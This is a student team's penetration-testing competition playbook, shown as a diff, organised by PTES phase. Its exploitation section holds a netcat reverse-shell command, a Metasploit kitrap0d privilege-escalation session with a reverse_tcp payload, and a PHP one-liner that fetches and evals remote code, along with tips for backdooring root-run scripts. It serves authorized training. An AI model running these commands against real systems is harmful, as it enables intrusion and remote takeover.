@@ -1,0 +1,263 @@
+Penetration Testing Execution Standard (PTES) For National University Team (CPTC Playbook)
+PTES defines penetration testing as 7 phases.
+1.    Pre-engagement Interactions
+2.    Intelligence Gathering
+3.    Threat Modeling
+4.    Vulnerability Analysis
+5.    Exploitation
+6.    Post Exploitation
+7.	Reporting
+Alt. Workflow Chart: https://www.sans.org/security-resources/posters/blueprint-building-pen-tester/160/download
+MACOS shortcuts:
+https://support.apple.com/en-us/HT201236 
+ 
+Linux Command line Cheat sheet:
+https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/Linuxcommand1.pdf
+https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/linux.pdf
+https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/bash_cheat_sheet.pdf
+
+(This cheat sheets are also available at Dr. Jaurez playbook, TrueSharkproducts )
+
+Phase 1. Pre-engagement Interactions (15 mins)
+Team needs to understand the Environment and general issues what the company is having.
+Gather questions, System knowledge, Installation of Tools.
+
+Phase 1.2 Installation of tools (30mins Need to be fully completed )
+Command line installation and No User Interface learn each one:  sudo apt-get install 
+sudo apt-get update
+sudo apt-get install git
+sudo apt-get install nmap     
+sudo apt-get install mimikatz
+sudo apt-get install wireshark
+sudo apt-get install metasploit
+sudo apt-get install postgresql
+sudo apt install postgresql postgresql-contrib
+====
+Installing ZAP
+git clone https://aur.archlinux.org/snapd.git
+sudo systemctl enable --now snapd.s
+sudo ln -s /var/lib/snapd/snap /snap
+sudo snap install zaproxy --classic
+=================================================
+Metasploit Framework:To download and install metasploit run:
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+./msfconsole
+Next steps > ===
+service postgresql start 
+
+msfdb init  //to create a database
+msfconsole
+
+Phase 2. Intelligence Gathering and Enumeration (Time: 2 hrs )
+Intelligence Gathering is the phase where data or "intelligence" is gathered to assist in guiding the assessment actions. At the broadest level this intelligence gathering includes information about employees, facilities, products and plans. Within a larger picture this intelligence will include potentially secret or private "intelligence" of a competitor, or information that is otherwise relevant to the target.
+Network and Information Tools:
+NMAP: https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/NmapCommands
+IPcommand and Ping command Cheat sheet:
+https://github.com/The-Art-of-Hacking/h4cker/blob/master/cheat_sheets/ip_command_cheatsheet.pdf
+Wireshark/ Tshark command line: https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/Wireshark%20command%20line%20for%20windows%20and%20Linux
+Tcpdump:
+ https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/TCPdumpCommands
+https://github.com/The-Art-of-Hacking/h4cker/blob/master/useful_commands_and_scripts/tcpdump.pdf
+Netcat cheat sheet:
+https://github.com/The-Art-of-Hacking/h4cker/blob/master/cheat_sheets/netcat-cheat-sheet.pdf
+
+Dirb (dirbuster), powerfuzzer: 
+
+
+Account Enumeration tools:
+Mimikatz:  https://github.com/gentilkiwi/mimikatz
+
+Tools to gather credential data from Windows systems. :
+https://github.com/gentilkiwi/mimikatz
+https://github.com/gentilkiwi/mimikatz/archive/2.1.1-20180925.zip
+
+PS tools suite: 
+https://docs.microsoft.com/en-us/sysinternals/downloads/pstools 
+
+Metasploit for SMB: https://github.com/The-Art-of-Hacking/h4cker/blob/master/cheat_sheets/MetasploitCheatsheet2.0.pdf
+
+Web Enumeration tools: 
+OWASP ZAP
+https://github.com/zaproxy/zap-core-help/wiki/HelpCmdline
+https://github.com/zaproxy/zaproxy/wiki/Downloads
+To enumerate Web services: 
+SQLMap: https://github.com/C0d3Break3r23/CyberTeam/blob/master/Tools/SQLInject-SQLMAP
+Burp Suite:
+-------------------------------------------------------------------------------------------------------
+TASK:
+1.Password Cracking (Time: 2hr) 
+Tools: John, Hashcat, Ophcrack (see Appendix 1) <- Need To know
+NTLM Authentication
+Planting backdoor: PSexec, Remote Exec, Netcat
+Keylogging
+Kerberos - cracking kerby check CEH pg 211
+
+Other Sites:
+http://open-sez.me/
+http://routerpasswords.com/
+
+2.Maintaining Access 
+·         List client User accounts and Admin 
+·         List  client Policies and rules. 
+·         SSH Tunneling: https://www.ssh.com/ssh/tunneling/
+·         SSH VNC Tunneling:   https://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html
+·         Capture User groups.
+·         Perform DNS Zone Transfer	
+o	NSlookup and dig on windows command.
+3.Data Harvesting and LOGS:()
+Enumeration workflow> Extracting information from email ID> bruteforce on directory services > exploiting  SNMP and SMTP. 
+Enumerate… Enumerate… Enumerate: check services and ports of interests.
+  LOCAL Linux + IP/DNS:  https://www.rebootuser.com/?p=1623 & https://www.rebootuser.com/?p=2189
+SMB Enum: https://github.com/m8r0wn/nullinux
+·         GOAT Net. Protocols: https://github.com/CoreSecurity/impacket
+·         Win + SMB: https://github.com/portcullislabs/enum4linux
+·         LFI: https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
+·         Push scripts: LinEnum - https://www.rebootuser.com/?p=1758
+
+Wget from github (aka upload to git)
+Initial Foothold
+
+Notes:
+
+Be careful with fuzzing/dirb/tcp-syn if IDS/IPS setup. Reduce frequency.
+Windows Commands and tools to use.
+
+Other Commands lines need to know: NSlookup, Nbstat to view logged into a computer.
+
+ Phase 3 and 4. Threat Modeling, Vulnerability Research and Scanning ( Time: Start ASAP Ongoing and reporting - Petra, Omer and Matt)
+Team Objective: Team need to create a  System Analysis, Open Hosts and port Scanning, Gather relevant documentation such as CVEs, Information about the vulnerability, Identify assets, Threat communities
+Team Task:  Gather information such as port information. Map the network
+a.            Ip address and Open port
+b.            Services and applications
+c.             Gathering Information and check for logs
+D.       Create threat modeling,  
+
+
+References:
+Check Blue Team Field Manual <- for Network Analysis.
+Vulnerability scanning tools: (Need this for reporting)
+https://cwatch.comodo.com/blog/website-security/top-10-vulnerability-assessment-scanning-tools/
+Free: Microsoft Baseline Security tools, Comodo Hacker proof, openVas, Nessus, Wireshark., Metasploit
+
+
+Phase 5 and 6.  Exploitation, Web and Service, and Post exploitation:(TEAM effort 4- 5hrs) - Service Penetration Testers 
+(Rich, Patrick and Jenny) 
+
+Learn this process:  https://www.cybrary.it/0p3n/post-exploitation-techniques/   
+
+
+Vulnerability Scanning of Web application:
+Steps: 
+Start with downloading tools: OWASP, SQLMAP, Msfconsole, Msfvenom and Meterpreter.
+Metasploit Framework:To download and install metasploit run:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+./msfconsole
+Next steps > ===
+service postgresql start 
+msfdb init  //to create a database
+msfconsole
+
+Reference:https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/
+
+
+Use WMAP - This is only when we found the ports and services or use the SQLMap enumeration tool and use this tool as a web vulnerability scanning for reporting
+
+msf > load wmap
+How to run the command example:   wmap_sites -a http://172.16.194.172
+wmap_vulns -l
+
+Another tool we can web crawl using: OWASP ZAP web crawler
+Linux Enumeration: RPCinfo,enum4linux, Session Logs
+==================================================
+Only if allowed and time permits, generating payloads with:
+
+Inline Payload and Reverse shell:
+Reverse shells: https://highon.coffee/blog/reverse-shell-cheat-sheet/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+ Privilege Escalation
+
+If Meterpreter: post/multi/recon/local_exploit_suggester
+Privilege Escalation
+NOTE: Don’t forget – the first thing you want to do after gaining access to remote system is to escalate your privileges (after migration of course). 
+Let’s run one more:
+meterpreter > getsystem
+…got system (via technique 4).
+meterpreter > background
+msf exploit(ms10_002_aurora) > use exploit/windows/local/
+msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
+msf exploit(ms10_015_kitrap0d) > set SESSION 1
+msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(ms10_015_kitrap0d) > set LHOST [Local host IPadddress]
+msf exploit(ms10_015_kitrap0d) > set LPORT 4443
+msf exploit(ms10_015_kitrap0d) > show options
+msf exploit(ms10_015_kitrap0d) > exploit
+meterpreter > getuid
+ 
+===================================================
+Other: 
+·         TRK: Trinity Rescue kit
+·         Directory Traversal Attacks:
+o	ACL and Groups
+·         Check file and directory permissions: Linux (ls -la)
+o	For example, if a file/script on a user's account can be ran as root, see if it can be edited or replaced. Insert a reverse shell line or something else that would be run as root.
+·         Pivoting: See if there are other accounts you can gain control of and see what permissions/files they have. The first user may lead to a second which leads to priv. Esc.
+
+Research if priv. esc. Vuln exists and may just require coding (Python!)
+
+Use Msfvenom:
+Other things to do:
+Things to do:
+Open Netcat or Msfconsole = 
+nc -e /bin/sh [IPADDR] [PORT]
+Example: nc.traditional -e /bin/bash 10.0.0.1 4444
+Web delivery exploit:
+msf > use exploit/multi/script/web_delivery
+msf exploit(web_delivery) > set TARGET 1
+TARGET => 1
+msf exploit(web_delivery) > set PAYLOAD php/meterpreter/reverse_tcp
+PAYLOAD => php/meterpreter/reverse_tcp
+msf exploit(web_delivery) > exploit
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://WEBIPADDRESS:8080/alK3t3tt'));"
+
+Other reference:
+https://www.offensive-security.com/metasploit-unleashed/
+https://www.exploit-db.com/google-hacking-database
+https://www.exploit-db.com/shellcodes
+https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+
+Phase 7. Documentation and Reporting. (Time: Ongoing and 1hr and 30mins till Sunday 3am) - Everyone.
+
+Task: providing detail list of all information gathered during pentest and team must provide a list of vulnerabilities and describe the vulnerabilities.  
+
+Include: (see google drive)
+1.Graph and charts.
+2.Evidence and Findings, evaluate the issue and reproduce it and fix it. 
+3.Creating policy and security recommendations
+4. Current CVE
+5. Providing security tool
+6. Providing list of patch updates.
+Include regulatory frameworks such as GLBA, PCI, FinCEN, KYC/AML, The US PATRIOT Act, FINRA, and others
+You can use https://draw.io for network diagrams (Basically the Google App version of Visio)
+Practice platform:
+https://www.hackthebox.eu/
+Resources:
+Go to supplemental reading material from TrueShark Products from Coach
+Github
+Instructional videos created.
+
+
+ 
+
+
+DINO BANK NOTES:
+https://cointelegraph.com/news/crypto-market-continues-to-show-green-candlesticks-btc-recovers-to-8-200
+Dino bank may focus on cryptocurrency: https://twitter.com/DinoCoin_UK
+
+0xfd77ee88f5678553a575b7302c48e9aba9597d8c.
+XRP:  https://cryptovest.com/news/xrp-targeted-in-partial-payment-exploit/
+Vulnerability papers and resources  for Bitcoin:
+https://www.exploit-db.com/exploits/42531
+https://www.weusecoins.com/assets/pdf/library/Lightning%20Network%20Whitepaper.pdf
+
